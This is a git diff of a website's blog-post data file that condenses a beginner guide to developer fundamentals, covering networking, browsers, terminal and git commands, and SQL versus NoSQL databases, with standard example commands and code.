@@ -7,7 +7,6 @@ export type BlogPost = {
   date: string;
   readTime: string;
   tags: string[];
-  customHref?: string;
   // Bilingual support
   titleBn?: string;
   excerptBn?: string;
@@ -2513,13 +2512,12 @@ app.get('/health', (req, res) => {
 Building robust REST APIs requires attention to security, validation, error handling, and testing. Start with a solid foundation and add features incrementally.
     `.trim(),
   },
-
   {
     slug: "developer-fundamentals-complete-guide",
     title: "Every Developer Must Know These Fundamentals",
     titleBn: "প্রতিটি ডেভেলপারের যে Fundamentals জানা আবশ্যক",
-    excerpt: "From how the internet works to security, git, databases, and authentication — a complete beginner-to-intermediate guide to the core concepts every developer must have crystal clear.",
-    excerptBn: "Internet কীভাবে কাজ করে থেকে শুরু করে security, git, database, authentication পর্যন্ত — প্রতিটি developer এর জন্য সেই core concepts এর complete guide যেগুলো যেকোনো কিছু build করার আগে crystal clear থাকা দরকার।",
+    excerpt: "From how the internet works to security, git, databases, and authentication — a complete guide to the core concepts every developer must have crystal clear before building anything serious.",
+    excerptBn: "Internet কীভাবে কাজ করে থেকে শুরু করে security, git, database, authentication পর্যন্ত — প্রতিটি developer এর জন্য সেই core concepts এর complete guide যেগুলো যেকোনো serious কিছু build করার আগে crystal clear থাকা দরকার।",
     category: "Software Engineering",
     date: "2025-03-10",
     readTime: "45 min read",
@@ -2537,21 +2535,9 @@ Building robust REST APIs requires attention to security, validation, error hand
 
 Every developer learns frameworks. Not every developer understands what happens underneath.
 
-You can build a Next.js app without knowing how HTTP works. You can use Git without understanding what a commit actually is. You can implement JWT auth without knowing why it is secure. And for a while, that is fine. But the moment something breaks in production — and it will — you will be completely lost without these fundamentals.
+You can build a Next.js app without knowing how HTTP works. You can use Git without understanding what a commit actually is. You can implement JWT auth without knowing why it is secure. But the moment something breaks in production — and it will — you will be completely lost without these fundamentals.
 
-Think of it this way: a driver can operate a car without knowing how the engine works. But when the car breaks down on a highway at midnight, that knowledge suddenly matters a lot.
-
-This guide covers eight core concepts that every developer must have crystal clear. Not because interviews ask about them — but because your code runs on top of all of them, every single day.
-
-**What you will learn:**
-- How data travels from your browser to a server and back
-- How browsers actually render what you see on screen
-- How to navigate and work in a terminal like a professional
-- How Git actually works under the hood
-- When to use SQL vs NoSQL databases
-- How authentication and authorization work
-- How to protect your app from the most common attacks
-- How networking concepts affect your application's performance
+This guide covers the eight concepts that separate developers who just write code from developers who actually understand what their code is doing.
 
 ---
 
@@ -2564,33 +2550,27 @@ This guide covers eight core concepts that every developer must have crystal cle
 ![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%204.png|Internet & Networking 5]
 ![gallery:/dev-fundamentals/Section:%20Internet_Networking/image%20copy%205.png|Internet & Networking 6]
 
-**Why this matters:** Every API call you make, every page your users load, every database query that goes over a network — all of it runs on top of these protocols. When your API is slow, when requests fail, when CORS errors appear — understanding this section tells you exactly where to look.
+Every time you open a browser and type a URL, a remarkable chain of events happens in milliseconds. Understanding this chain is non-negotiable for any developer.
 
 ### The Big Picture
-
-Let's trace exactly what happens when you type \`https://google.com\` and press Enter:
 
 \`\`\`
 You type: https://google.com
          ↓
-1. DNS Lookup      — "What is the IP address of google.com?"
-2. TCP Handshake   — "Let's establish a reliable connection"
-3. TLS Handshake   — "Let's encrypt this connection"
-4. HTTP Request    — "Give me the homepage"
-5. Server Response — "Here is the HTML"
-6. Browser Render  — "Let me display this for the user"
+1. DNS Lookup      — translate domain to IP address
+2. TCP Handshake   — establish connection
+3. TLS Handshake   — secure the connection (HTTPS)
+4. HTTP Request    — browser asks for the page
+5. Server Response — server sends back HTML/CSS/JS
+6. Browser Render  — browser displays the page
 \`\`\`
-
-Each step is a separate system. Each can fail independently. When you know this, debugging becomes much easier.
 
 ### DNS — The Internet's Phone Book
 
-Imagine you want to call your friend. You do not memorize their phone number — you search their name in your contacts and your phone finds the number. DNS works exactly the same way.
-
-DNS (Domain Name System) translates human-readable domain names like \`google.com\` into IP addresses like \`142.250.80.46\` that computers use to actually communicate.
+DNS (Domain Name System) translates human-readable domain names into IP addresses that computers use to communicate.
 
 When you type \`google.com\`:
-1. Browser checks its own DNS cache (did I look this up recently?)
+1. Browser checks its own DNS cache
 2. OS checks its local cache
 3. Query goes to your ISP's DNS resolver
 4. Resolver asks the root nameserver
@@ -2600,27 +2580,23 @@ When you type \`google.com\`:
 
 This entire process takes under 50ms. The result is cached so it does not repeat on every request.
 
-**Real-world impact:** When you deploy your app to Vercel and add a custom domain, you are creating a DNS A record that points your domain to Vercel's IP address. That is all DNS is.
-
-### TCP — The Reliable Postman
-
-Imagine sending a large book through the mail by tearing it into 100 pages and mailing each page separately. Some pages might arrive out of order. Some might get lost. TCP is the system that makes sure all 100 pages arrive, in the right order, with nothing missing.
+### TCP — Reliable Delivery
 
 TCP (Transmission Control Protocol) ensures data arrives completely and in order. Before any data is sent, TCP performs a **three-way handshake**:
 
 \`\`\`
-Client → Server: SYN       ("Hey, I want to talk to you")
-Server → Client: SYN-ACK   ("Sure, I'm ready")
-Client → Server: ACK       ("Great, let's go")
+Client → Server: SYN       (I want to connect)
+Server → Client: SYN-ACK   (OK, I'm ready)
+Client → Server: ACK       (Great, let's go)
 \`\`\`
 
-This handshake takes one round trip — which is why the first request to a server is always slightly slower than subsequent ones.
+After this handshake, the connection is established and data can flow reliably in both directions.
 
-### HTTP vs HTTPS — The Language of the Web
+### HTTP vs HTTPS
 
-HTTP (HyperText Transfer Protocol) is the language browsers and servers use to communicate. Think of it as the agreed-upon format for asking questions and giving answers.
+HTTP (HyperText Transfer Protocol) is the language browsers and servers use to communicate.
 
-**HTTP Request** (browser asking):
+**HTTP Request:**
 \`\`\`http
 GET /api/users HTTP/1.1
 Host: api.example.com
@@ -2628,7 +2604,7 @@ Authorization: Bearer eyJhbGci...
 Content-Type: application/json
 \`\`\`
 
-**HTTP Response** (server answering):
+**HTTP Response:**
 \`\`\`http
 HTTP/1.1 200 OK
 Content-Type: application/json
@@ -2636,34 +2612,27 @@ Content-Type: application/json
 { "users": [...] }
 \`\`\`
 
-HTTPS adds TLS (Transport Layer Security) on top of HTTP. Without HTTPS, your data travels as plain text — anyone on the same WiFi network can read it. With HTTPS, everything is encrypted.
+HTTPS adds TLS (Transport Layer Security) on top of HTTP. TLS encrypts all data between client and server so no one in the middle can read it. This is why you see the padlock icon in your browser.
 
-**A simple analogy:** HTTP is like sending a postcard — anyone who handles it can read it. HTTPS is like sending a sealed, locked envelope that only the recipient can open.
+**HTTP Status Codes you must know:**
 
-**HTTP Status Codes — the language of responses:**
-
-| Code | Meaning | When you see it |
-|---|---|---|
-| 200 | OK | Request succeeded |
-| 201 | Created | New resource was created (POST) |
-| 301 | Moved Permanently | URL has changed |
-| 400 | Bad Request | You sent invalid data |
-| 401 | Unauthorized | You are not logged in |
-| 403 | Forbidden | Logged in but not allowed |
-| 404 | Not Found | Resource does not exist |
-| 429 | Too Many Requests | Rate limited |
-| 500 | Internal Server Error | Server crashed |
-
-The difference between 401 and 403 trips up many beginners. **401** means "I don't know who you are" (not logged in). **403** means "I know who you are, but you can't do this" (no permission).
+| Code | Meaning |
+|---|---|
+| 200 | OK — success |
+| 201 | Created — resource created |
+| 301 | Moved Permanently — redirect |
+| 400 | Bad Request — client sent invalid data |
+| 401 | Unauthorized — not authenticated |
+| 403 | Forbidden — authenticated but not allowed |
+| 404 | Not Found — resource does not exist |
+| 429 | Too Many Requests — rate limited |
+| 500 | Internal Server Error — server crashed |
 
 ### IP Addresses and Ports
 
-Every device on the internet has an IP address — like a home address. A port is like an apartment number in that building — it identifies which specific service you want to reach.
+Every device on the internet has an IP address. A port identifies a specific service on that device.
 
 \`\`\`
-IP Address = the building  (192.168.1.1)
-Port       = the apartment (3000)
-
 Common ports:
 80   → HTTP
 443  → HTTPS
@@ -2673,7 +2642,7 @@ Common ports:
 3000 → Node.js dev server (convention)
 \`\`\`
 
-When you run \`pnpm dev\` and see \`localhost:3000\`, you are connecting to IP \`127.0.0.1\` (your own machine) on port \`3000\` (where your Node.js server is listening).
+When you run \`pnpm dev\` and see \`localhost:3000\`, you are connecting to IP \`127.0.0.1\` (your own machine) on port \`3000\`.
 
 ---
 
@@ -2687,104 +2656,57 @@ When you run \`pnpm dev\` and see \`localhost:3000\`, you are connecting to IP \
 ![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%205.png|Browser Concepts 6]
 ![gallery:/dev-fundamentals/Section:%20Software%20Engineering%20Core%20Concepts/image%20copy%206.png|Browser Concepts 7]
 
-**Why this matters:** React, Vue, Next.js — they all run inside the browser. If you don't understand how the browser works, you can't understand why React re-renders, why your CSS is slow, or why your JavaScript blocks the UI.
+The browser is the most complex piece of software most developers interact with daily. Understanding how it works makes you a dramatically better frontend developer.
 
-### The Rendering Pipeline — How a Page Appears on Screen
+### The Rendering Pipeline
 
-When a browser receives HTML from a server, it doesn't just "show" it. It goes through a precise sequence of steps:
+When a browser receives HTML from a server, it goes through a precise sequence:
 
 \`\`\`
-HTML bytes received from server
+HTML bytes received
        ↓
-1. Parse HTML   → build DOM tree (the structure)
-2. Parse CSS    → build CSSOM tree (the styles)
+1. Parse HTML   → build DOM tree
+2. Parse CSS    → build CSSOM tree
 3. Combine      → Render Tree (only visible elements)
-4. Layout       → calculate exact position and size of each element
-5. Paint        → fill in pixels (colors, borders, text, images)
-6. Composite    → layer everything together and display on screen
+4. Layout       → calculate position and size of each element
+5. Paint        → fill in pixels (colors, borders, text)
+6. Composite    → layer everything together on screen
 \`\`\`
 
-Think of it like building a house:
-- **DOM** = the blueprint (structure)
-- **CSSOM** = the interior design plan (styles)
-- **Layout** = measuring where each room goes
-- **Paint** = actually painting the walls
-- **Composite** = taking a photo of the finished house
+### The DOM
 
-### The DOM — What JavaScript Actually Manipulates
+The DOM (Document Object Model) is the browser's in-memory representation of your HTML as a tree of objects. JavaScript can read and modify this tree in real time — that is how React, Vue, and every other frontend framework works.
 
-The DOM (Document Object Model) is the browser's in-memory representation of your HTML as a tree of objects. It is NOT the HTML file — it is a live, interactive object that JavaScript can read and modify in real time.
+### The JavaScript Event Loop
 
-\`\`\`html
-<html>
-  <body>
-    <h1>Hello</h1>
-    <p>World</p>
-  </body>
-</html>
-\`\`\`
-
-Becomes this tree in memory:
-\`\`\`
-Document
-└── html
-    └── body
-        ├── h1 → "Hello"
-        └── p  → "World"
-\`\`\`
-
-When React "updates the UI", it is modifying this tree. When you do \`document.getElementById('btn')\`, you are reaching into this tree. Every frontend framework — React, Vue, Angular — is ultimately just a tool for managing this tree efficiently.
-
-### The JavaScript Event Loop — Why JS Doesn't Freeze
-
-This is one of the most misunderstood concepts in JavaScript. Here is the truth: **JavaScript is single-threaded** — it can only do one thing at a time. Yet it handles network requests, timers, and user clicks without freezing. How?
-
-The answer is the **Event Loop**:
-
-\`\`\`
-┌─────────────────────────┐
-│       Call Stack        │  ← executes code line by line
-└────────────┬────────────┘
-             ↑ when stack is empty, pulls from queue
-┌────────────┴────────────┐
-│      Callback Queue     │  ← completed async tasks wait here
-└────────────┬────────────┘
-             ↑ async tasks go here when done
-┌────────────┴────────────┐
-│    Web APIs (browser)   │  ← handles setTimeout, fetch, events
-└─────────────────────────┘
-\`\`\`
+JavaScript is **single-threaded** — it can only do one thing at a time. But it handles async operations without blocking. The Event Loop constantly checks: is the Call Stack empty? If yes, take the next callback from the Event Queue and push it onto the Call Stack.
 
 \`\`\`javascript
-console.log("1");        // goes to Call Stack → runs immediately
+console.log("1");        // sync → runs immediately
 
 setTimeout(() => {
-  console.log("2");      // goes to Web API → waits → Callback Queue → Call Stack
+  console.log("2");      // async → goes through Event Queue
 }, 0);
 
-console.log("3");        // goes to Call Stack → runs immediately
+console.log("3");        // sync → runs immediately
 
 // Output: 1, 3, 2
-// Even with 0ms delay, "2" runs last because it goes through the queue
+// Even with 0ms delay, setTimeout is async
 \`\`\`
 
-**Why this matters for you:** This is why you use \`async/await\` for API calls. If you made a network request synchronously, it would freeze the entire browser until the response came back.
-
-### Critical Rendering Path — Why Performance Matters
+### Critical Rendering Path
 
 \`\`\`html
-<!-- BAD: blocks rendering — browser stops and waits for this script -->
+<!-- Blocks rendering — browser waits before showing anything -->
 <head>
   <script src="heavy-script.js"></script>
 </head>
 
-<!-- GOOD: non-blocking — downloads in parallel, runs after HTML is parsed -->
+<!-- Non-blocking — downloads in parallel, executes after HTML parsed -->
 <head>
   <script src="heavy-script.js" defer></script>
 </head>
 \`\`\`
-
-This is why Next.js automatically optimizes script loading. It is also why large JavaScript bundles make your site feel slow — the browser has to download, parse, and execute all that JS before showing anything.
 
 ### localStorage vs sessionStorage vs Cookies
 
@@ -2794,116 +2716,103 @@ This is why Next.js automatically optimizes script loading. It is also why large
 | sessionStorage | ~5MB | Tab close | No | Yes |
 | Cookie | ~4KB | Configurable | Yes (every request) | Yes (unless HttpOnly) |
 
-**The rule:** Use \`HttpOnly\` cookies for auth tokens — JavaScript cannot read them, so even if an attacker injects JS into your page, they cannot steal the token. Never store passwords or tokens in localStorage.
+**Rule:** Use cookies for auth tokens (with \`HttpOnly\` and \`Secure\` flags). Never store sensitive data in localStorage — any JavaScript on the page can read it.
 
 ---
 
 ## 3. OS & Terminal Basics
 
-**Why this matters:** Most production servers run Linux. Vercel, AWS, DigitalOcean — they all run Linux under the hood. If you cannot navigate the terminal, you are helpless when something breaks in production. There is no GUI there.
+Every developer works on an operating system. Most production servers run Linux. If you cannot navigate the terminal, you are dependent on GUIs that will not exist in production environments.
 
-### The File System — How Files Are Organized
+### The File System
 
 \`\`\`
-/                        ← root (the top of everything)
+/                    <- root (top of everything)
 ├── home/
-│   └── tushar/          ← your home directory, also written as ~
+│   └── tushar/      <- your home directory (~)
 │       ├── projects/
-│       └── .bashrc      ← hidden files start with a dot
-├── etc/                 ← system configuration files
+│       └── .bashrc
+├── etc/             <- system config files
 ├── var/
-│   └── log/             ← system logs (check here when things break)
+│   └── log/         <- system logs
 └── usr/
-    └── bin/             ← installed programs live here
+    └── bin/         <- installed programs
 \`\`\`
 
-### Essential Commands — The Ones You Use Every Day
+### Essential Commands
 
 \`\`\`bash
 # Navigation
-pwd                   # where am I right now?
-ls -la                # list all files including hidden ones
-cd projects           # go into the projects folder
-cd ..                 # go up one level
-cd ~                  # go to home directory from anywhere
+pwd                  # print working directory
+ls -la               # list all files (including hidden)
+cd projects          # change directory
+cd ..                # go up one level
+cd ~                 # go to home directory
 
-# Files & Folders
-mkdir my-app          # create a new folder
-touch index.js        # create an empty file
-cp file.txt copy.txt  # copy a file
-mv old.txt new.txt    # rename or move a file
-rm file.txt           # delete a file
-rm -rf folder/        # delete a folder and everything inside (careful!)
+# Files & Directories
+mkdir my-project     # create directory
+touch index.js       # create empty file
+cp file.txt copy.txt # copy file
+mv file.txt new.txt  # move or rename file
+rm file.txt          # delete file
+rm -rf folder/       # delete folder recursively (careful!)
 
 # Reading Files
-cat file.txt          # print the entire file
-head -n 20 file.txt   # show first 20 lines
-tail -f app.log       # watch a log file update in real time (very useful!)
-grep "error" app.log  # search for the word "error" in a file
+cat file.txt         # print entire file
+head -n 20 file.txt  # first 20 lines
+tail -f app.log      # follow log file in real time
+grep "error" app.log # search for pattern in file
 
 # Processes
-ps aux                # list all running processes
-lsof -i :3000         # what process is using port 3000?
-kill -9 <PID>         # force stop a process by its ID
+ps aux               # list all running processes
+kill -9 <PID>        # force kill a process
+lsof -i :3000        # what is using port 3000?
 
 # Network
-curl https://api.example.com        # make an HTTP GET request
-curl -X POST -H "Content-Type: application/json" -d '{"name":"test"}' https://api.example.com
-ping google.com       # check if you can reach a server
+curl https://api.example.com/users   # HTTP GET request
+ping google.com                      # check connectivity
 \`\`\`
 
-### File Permissions — Why You See "Permission Denied"
+### File Permissions
 
 \`\`\`
 -rwxr-xr-x  tushar  script.sh
  │││││││││
- │││││││└└─ other:  r-x (can read and execute, cannot write)
- │││││└└─── group:  r-x (can read and execute, cannot write)
- │││└─────── owner: rwx (can read, write, and execute)
- └────────── type:  - (regular file), d (directory)
+ │││││││└└─ other:  r-x (read + execute)
+ │││││└└─── group:  r-x (read + execute)
+ │││└────── owner:  rwx (read + write + execute)
+ └───────── file type: - (regular file)
 
-r = read    (4)
-w = write   (2)
-x = execute (1)
-
-chmod 755 file  →  rwxr-xr-x  (owner: 7=4+2+1, group: 5=4+1, other: 5=4+1)
-chmod 644 file  →  rw-r--r--  (owner can write, others can only read)
+r = read (4), w = write (2), x = execute (1)
+chmod 755 = rwxr-xr-x
 \`\`\`
 
-You see "Permission denied" when you try to do something the file permissions don't allow.
-
-### Environment Variables — How Secrets Stay Out of Code
+### Environment Variables
 
 \`\`\`bash
-# Set temporarily (only for this terminal session)
+# Set temporarily (current session only)
 export DATABASE_URL="postgresql://localhost/mydb"
 
 # Read a variable
 echo $DATABASE_URL
 
-# Set permanently (add to ~/.bashrc or ~/.zshrc)
+# Set permanently
 echo 'export MY_VAR="value"' >> ~/.bashrc
-source ~/.bashrc   # reload the file so changes take effect
+source ~/.bashrc
 \`\`\`
 
-This is exactly how \`.env.local\` works in Next.js — it reads these key-value pairs and injects them into \`process.env\` when your server starts. The reason you never commit \`.env\` files is that environment variables are the standard way to keep secrets out of your code.
+This is exactly how \`.env.local\` works in Next.js — it injects environment variables into the Node.js process at startup.
 
 ### SSH — Connecting to Remote Servers
 
 \`\`\`bash
 # Connect to a server
 ssh username@192.168.1.100
-ssh -i ~/.ssh/my-key.pem ubuntu@your-ec2-ip.amazonaws.com
+ssh -i ~/.ssh/my-key.pem ubuntu@ec2-ip.amazonaws.com
 
-# Copy a file TO a server
-scp local-file.txt username@server:/home/username/
-
-# Copy a file FROM a server
-scp username@server:/var/log/app.log ./local-copy.log
+# Copy files to/from server
+scp file.txt username@server:/home/username/
 \`\`\`
-
-When you deploy to a VPS (like DigitalOcean or AWS EC2), SSH is how you get inside the server to check logs, restart services, or debug issues.
-
 
 ---
 
@@ -2916,125 +2825,104 @@ When you deploy to a VPS (like DigitalOcean or AWS EC2), SSH is how you get insi
 ![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%204.png|Git & Version Control 5]
 ![gallery:/dev-fundamentals/Section:%20Git%20%26%20Version%20Control/image%20copy%205.png|Git & Version Control 6]
 
-**Why this matters:** Git is not optional. Every professional team uses it. Without Git, you cannot collaborate, cannot roll back mistakes, and cannot deploy safely. It is the single most important tool in a developer's workflow after the code editor itself.
+Git is not just a backup tool. It is a time machine, a collaboration system, and a safety net. Every professional developer must understand it deeply.
 
-### How Git Actually Works — Snapshots, Not Diffs
+### How Git Actually Works
 
-Most people think Git saves the "changes" between versions. That is wrong. Git saves **complete snapshots** of your entire project at each commit.
-
-Think of it like taking a photograph of your entire codebase at a specific moment. Each commit is one photograph. Git keeps all the photographs in order, and you can jump back to any of them at any time.
+Git stores your project as a series of **snapshots**, not diffs. Each commit is a complete snapshot of every file at that point in time, with a pointer to the previous commit.
 
 \`\`\`
-Commit A  ←  Commit B  ←  Commit C  ←  (you are here)
-  │              │              │
-  │              │              └── snapshot of all files at this moment
-  │              └── snapshot of all files at this moment
-  └── snapshot of all files at this moment
+Commit C  <-  Commit B  <-  Commit A  <-  (initial)
+  |
+  Each has: tree (files), author, message, timestamp
 \`\`\`
 
-Each commit stores:
-- A complete snapshot of every tracked file
-- The author name and email
-- The commit message
-- A timestamp
-- A pointer to the previous commit
-
-### The Three Areas — Where Your Code Lives
+### The Three Areas
 
 \`\`\`
-Working Directory   →   Staging Area   →   Repository
-  (your files)           (git add)          (git commit)
-
-Working Directory: files you are editing right now
-Staging Area:      files you have marked "include in next commit"
-Repository:        the permanent history of all commits
+Working Directory   ->   Staging Area   ->   Repository
+  (your files)           (git add)            (git commit)
 \`\`\`
 
-**Analogy:** Think of it like packing a suitcase.
-- **Working Directory** = your room with clothes scattered everywhere
-- **Staging Area** = the clothes you have picked and placed on the bed
-- **Repository** = the suitcase, zipped and stored permanently
+- **Working Directory:** Files you are editing right now
+- **Staging Area:** Files marked to include in the next commit
+- **Repository:** The permanent history of all commits
 
 ### Essential Git Commands
 
 \`\`\`bash
-# One-time setup
+# Setup
 git config --global user.name "Tushar Barua"
 git config --global user.email "tushar@example.com"
 
-# Starting a project
-git init                        # start tracking a new project
-git clone https://github.com/user/repo.git  # copy an existing repo
+# Start
+git init                      # initialize new repo
+git clone <url>               # clone existing repo
 
 # Daily workflow
-git status                      # what has changed?
-git add file.txt                # stage a specific file
-git add .                       # stage all changed files
-git commit -m "feat: add login page"  # save a snapshot
-git push origin main            # upload to GitHub
-git pull origin main            # download latest changes
+git status                    # what changed?
+git add .                     # stage all changes
+git commit -m "feat: add login page"
+git push origin main          # push to remote
+git pull origin main          # pull latest changes
 
 # Branching
-git branch                      # list all branches
-git checkout -b feature/auth    # create a new branch and switch to it
-git checkout main               # switch back to main
-git merge feature/auth          # merge a branch into current branch
-git branch -d feature/auth      # delete a branch after merging
+git checkout -b feature/auth  # create + switch branch
+git merge feature/auth        # merge into current branch
+git branch -d feature/auth    # delete branch
 
 # Inspection
-git log --oneline               # see commit history (compact)
-git diff                        # see what changed (not yet staged)
-git diff --staged               # see what is staged
+git log --oneline             # compact commit history
+git diff                      # what changed (unstaged)
+git show <commit-hash>        # show specific commit
 
-# Undoing mistakes
-git restore file.txt            # discard changes in working directory
-git restore --staged file.txt   # unstage a file
-git revert <commit-hash>        # undo a commit safely (keeps history)
-git reset --hard HEAD~1         # undo last commit and discard changes (destructive!)
+# Undoing
+git restore file.txt          # discard working dir changes
+git revert <hash>             # undo commit (safe, keeps history)
+git reset --hard HEAD~1       # undo last commit (destructive!)
 \`\`\`
 
-### Branching Strategy — How Teams Work Together
+### Branching Strategy
 
 \`\`\`
-main          ← production code only — always deployable
-  └── develop ← integration branch — merge features here first
-       ├── feature/user-login
-       ├── feature/dashboard
-       └── fix/navbar-bug
+main          <- production-ready code only
+  └─ develop  <- integration branch
+       ├─ feature/login
+       ├─ feature/dashboard
+       └─ fix/navbar-bug
 \`\`\`
 
-**The golden rule:** Never commit directly to \`main\`. Always create a feature branch, do your work, open a Pull Request, get it reviewed, then merge. This protects production from broken code.
+**Rule:** Never commit directly to \`main\`. Always work on a feature branch, open a Pull Request, get it reviewed, then merge.
 
 ### Writing Good Commit Messages
 
 \`\`\`bash
-# Bad — tells you nothing
+# Bad
 git commit -m "fix"
-git commit -m "update"
-git commit -m "asdfgh"
+git commit -m "changes"
 
 # Good — Conventional Commits format
 git commit -m "feat: add user authentication with JWT"
 git commit -m "fix: resolve null pointer in login handler"
-git commit -m "refactor: extract email validation to utility function"
-git commit -m "docs: update README with setup instructions"
-git commit -m "chore: upgrade all dependencies to latest versions"
+git commit -m "refactor: extract email validation to utility"
+git commit -m "docs: update API documentation"
+git commit -m "chore: upgrade dependencies to latest"
 \`\`\`
 
-Format: \`type: short description\`
+Format: \`type(scope): description\`
 - \`feat\` — new feature
 - \`fix\` — bug fix
-- \`refactor\` — code improvement, not a fix or feature
+- \`refactor\` — code change that is not a fix or feature
 - \`docs\` — documentation only
-- \`chore\` — maintenance, dependencies
+- \`chore\` — build process, dependencies
 
-Good commit messages are a gift to your future self and your teammates.
-
-### .gitignore — What NOT to Track
+### .gitignore
 
 \`\`\`gitignore
-# Never commit these
+# Dependencies
 node_modules/
+
+# Environment variables — NEVER commit these
 .env
 .env.local
 .env.production
@@ -3044,12 +2932,11 @@ node_modules/
 dist/
 build/
 
-# OS junk
+# OS files
 .DS_Store
-Thumbs.db
 \`\`\`
 
-**Critical rule:** Once a secret is committed to Git history, it is compromised — even if you delete it in the next commit, it still exists in the history. Anyone who clones the repo can find it. Always add \`.env\` to \`.gitignore\` before your first commit.
+**Critical rule:** Never commit \`.env\` files. Once a secret is in Git history, it is compromised — even if you delete it later, it remains in the history.
 
 ---
 
@@ -3061,62 +2948,67 @@ Thumbs.db
 ![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy%203.png|Database Fundamentals 4]
 ![gallery:/dev-fundamentals/Section:%20Database%20Fundamentals/image%20copy%204.png|Database Fundamentals 5]
 
-**Why this matters:** Every application stores data. Choosing the wrong database type is an architectural mistake that is very expensive to fix later. Understanding the difference helps you make the right choice from day one.
+Every application needs to store data. Choosing the wrong database type is an architectural mistake that is expensive to fix later.
 
-### Relational Databases (SQL) — Data in Tables
+### Relational Databases (SQL)
 
-SQL databases store data in tables with rows and columns — like a very powerful spreadsheet. Relationships between tables are defined by foreign keys.
+SQL databases store data in tables with rows and columns. Relationships between tables are defined by foreign keys. The schema is strict — you define the structure before inserting data.
 
 \`\`\`sql
--- Create a users table
+-- Create tables
 CREATE TABLE users (
-  id         SERIAL PRIMARY KEY,
-  email      VARCHAR(255) UNIQUE NOT NULL,
-  name       VARCHAR(100) NOT NULL,
+  id        SERIAL PRIMARY KEY,
+  email     VARCHAR(255) UNIQUE NOT NULL,
+  name      VARCHAR(100) NOT NULL,
   created_at TIMESTAMP DEFAULT NOW()
 );
 
--- Create a posts table that references users
 CREATE TABLE posts (
-  id         SERIAL PRIMARY KEY,
-  title      VARCHAR(255) NOT NULL,
-  content    TEXT,
-  author_id  INT REFERENCES users(id),  -- foreign key
+  id        SERIAL PRIMARY KEY,
+  title     VARCHAR(255) NOT NULL,
+  content   TEXT,
+  author_id INT REFERENCES users(id),
   created_at TIMESTAMP DEFAULT NOW()
 );
-\`\`\`
 
-**Core SQL operations:**
-\`\`\`sql
--- INSERT — add a new row
-INSERT INTO users (email, name) VALUES ('tushar@example.com', 'Tushar');
-
--- SELECT — read data
-SELECT * FROM users WHERE email = 'tushar@example.com';
-
--- JOIN — combine data from two tables
+-- Query with JOIN
 SELECT posts.title, users.name
 FROM posts
 JOIN users ON posts.author_id = users.id
+WHERE posts.created_at > NOW() - INTERVAL '7 days'
 ORDER BY posts.created_at DESC;
-
--- UPDATE — modify existing data
-UPDATE users SET name = 'Tushar Barua' WHERE id = 1;
-
--- DELETE — remove data
-DELETE FROM users WHERE id = 1;
 \`\`\`
 
-**Popular SQL databases:** PostgreSQL (best for production), MySQL, SQLite (great for development and mobile apps)
+**Core SQL operations:**
 
-### NoSQL Databases — Flexible Data
+\`\`\`sql
+-- INSERT
+INSERT INTO users (email, name) VALUES ('tushar@example.com', 'Tushar');
 
-NoSQL databases store data in flexible formats — no fixed schema required. The most common type is document databases, where each record is a JSON-like object.
+-- SELECT with filter
+SELECT * FROM users WHERE email = 'tushar@example.com';
 
+-- UPDATE
+UPDATE users SET name = 'Tushar Barua' WHERE id = 1;
+
+-- DELETE
+DELETE FROM users WHERE id = 1;
+
+-- Aggregate
+SELECT COUNT(*), AVG(age) FROM users WHERE active = true;
+\`\`\`
+
+**Popular SQL databases:** PostgreSQL (best for production), MySQL, SQLite (development/embedded)
+
+### NoSQL Databases
+
+NoSQL databases store data in flexible formats — documents, key-value pairs, graphs, or wide columns. No fixed schema required.
+
+**Document databases (MongoDB):**
 \`\`\`javascript
-// MongoDB document — looks like a JavaScript object
+// Documents look like JSON objects
 {
-  _id: "abc123",
+  _id: ObjectId("..."),
   email: "tushar@example.com",
   name: "Tushar",
   posts: [
@@ -3130,6 +3022,15 @@ db.users.findOne({ email: "tushar@example.com" });
 db.users.find({ "posts.tags": "react" });
 \`\`\`
 
+**Key-Value stores (Redis):**
+\`\`\`javascript
+// Store and retrieve values
+await redis.set("user:123", JSON.stringify(user), "EX", 3600); // expires in 1hr
+const user = JSON.parse(await redis.get("user:123"));
+
+// Use cases: caching, sessions, rate limiting, pub/sub
+\`\`\`
+
 ### SQL vs NoSQL — When to Use What
 
 | Factor | SQL (PostgreSQL) | NoSQL (MongoDB) |
@@ -3137,163 +3038,765 @@ db.users.find({ "posts.tags": "react" });
 | Data structure | Structured, consistent | Flexible, varying |
 | Relationships | Complex joins, foreign keys | Embedded documents |
 | Schema | Fixed, enforced | Dynamic, flexible |
-| Transactions | Full ACID support | Limited |
-| Best for | Finance, e-commerce, ERP | Content, catalogs, real-time feeds |
+| Scaling | Vertical (mostly) | Horizontal (easier) |
+| Transactions | Full ACID support | Limited (improving) |
+| Best for | Financial, e-commerce, ERP | Content, catalogs, real-time |
 
-**Simple rule of thumb:**
+**Rule of thumb:**
 - Use **PostgreSQL** by default. It handles 99% of use cases, has full ACID transactions, and scales well.
-- Use **MongoDB** when your data is genuinely document-shaped and the schema varies a lot between records.
+- Use **MongoDB** when your data is genuinely document-shaped and schema varies significantly between records.
 - Use **Redis** for caching, sessions, and anything that needs sub-millisecond reads.
 
 ### Indexes — The Most Important Performance Tool
 
-Without an index, a database has to scan every single row to find what you are looking for — like reading an entire book to find one word. An index is like the book's index at the back — it lets the database jump directly to the right page.
-
 \`\`\`sql
--- Without index: scans every row — O(n) — slow on large tables
+-- Without index: full table scan O(n)
 SELECT * FROM users WHERE email = 'tushar@example.com';
 
--- Create an index on the email column
+-- Create index
 CREATE INDEX idx_users_email ON users(email);
 
--- Now the same query uses the index — O(log n) — fast even with millions of rows
+-- Now the same query uses the index: O(log n)
+-- Always index columns you filter or sort by frequently
 \`\`\`
 
-**Rule:** Always index columns you filter or sort by frequently. The most common ones are \`email\`, \`user_id\`, \`created_at\`.
+### Transactions
 
-### Transactions — All or Nothing
-
-A transaction groups multiple operations so they either all succeed or all fail together. This is critical for financial operations.
+A transaction groups multiple operations so they either all succeed or all fail. Critical for financial operations.
 
 \`\`\`sql
--- Transfer money between accounts
 BEGIN;
   UPDATE accounts SET balance = balance - 500 WHERE id = 1;
   UPDATE accounts SET balance = balance + 500 WHERE id = 2;
 COMMIT;
-
--- If anything fails between BEGIN and COMMIT,
--- ROLLBACK automatically undoes both operations
--- The money never disappears into thin air
+-- If anything fails, ROLLBACK automatically undoes both
 \`\`\`
 
